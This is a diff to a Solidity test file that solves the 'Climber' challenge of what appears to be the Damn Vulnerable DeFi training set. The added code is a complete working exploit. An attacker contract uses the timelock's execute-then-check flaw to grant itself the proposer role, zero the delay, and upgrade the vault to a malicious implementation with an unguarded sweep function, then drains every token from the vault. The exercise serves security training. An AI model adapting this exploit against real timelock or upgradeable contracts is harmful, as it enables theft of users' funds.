@@ -43,7 +43,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +88,13 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        ClimberAttacker attacker = new ClimberAttacker(
+            timelock,
+            vault,
+            token,
+            recovery
+        );
+        attacker.attack();
     }
 
     /**
@@ -93,6 +102,93 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+// Malicious vault implementation that sweeps all tokens
+contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    function sweepAll(address token, address to) external {
+        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
+    }
+
+    function _authorizeUpgrade(address) internal override {}
+}
+
+contract ClimberAttacker {
+    ClimberTimelock private timelock;
+    ClimberVault private vault;
+    DamnValuableToken private token;
+    address private recovery;
+
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private salt;
+
+    constructor(
+        ClimberTimelock _timelock,
+        ClimberVault _vault,
+        DamnValuableToken _token,
+        address _recovery
+    ) {
+        timelock = _timelock;
+        vault = _vault;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // Build the batch of operations to execute via timelock
+        // Action 1: Grant PROPOSER_ROLE to this attacker contract
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)))
+        );
+
+        // Action 2: Set delay to 0 (so operations are immediately ready)
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeCall(timelock.updateDelay, (0)));
+
+        // Action 3: Upgrade vault to malicious implementation
+        MaliciousVault maliciousImpl = new MaliciousVault();
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(
+            abi.encodeCall(
+                vault.upgradeToAndCall,
+                (address(maliciousImpl), bytes(""))
+            )
+        );
+
+        // Action 4: Call this contract to schedule the batch (making it retroactively valid)
+        targets.push(address(this));
+        values.push(0);
+        dataElements.push(abi.encodeCall(this.scheduleOperation, ()));
+
+        salt = bytes32("attack");
+
+        // Execute! The timelock runs all actions first, then checks if scheduled.
+        // Action 4 schedules this batch during execution.
+        timelock.execute(targets, values, dataElements, salt);
+
+        // Now sweep the tokens from the upgraded vault
+        MaliciousVault(address(vault)).sweepAll(address(token), recovery);
+    }
+
+    // Called by the timelock during execute() — we now have PROPOSER_ROLE, so we can schedule
+    function scheduleOperation() external {
+        timelock.schedule(targets, values, dataElements, salt);
     }
 }
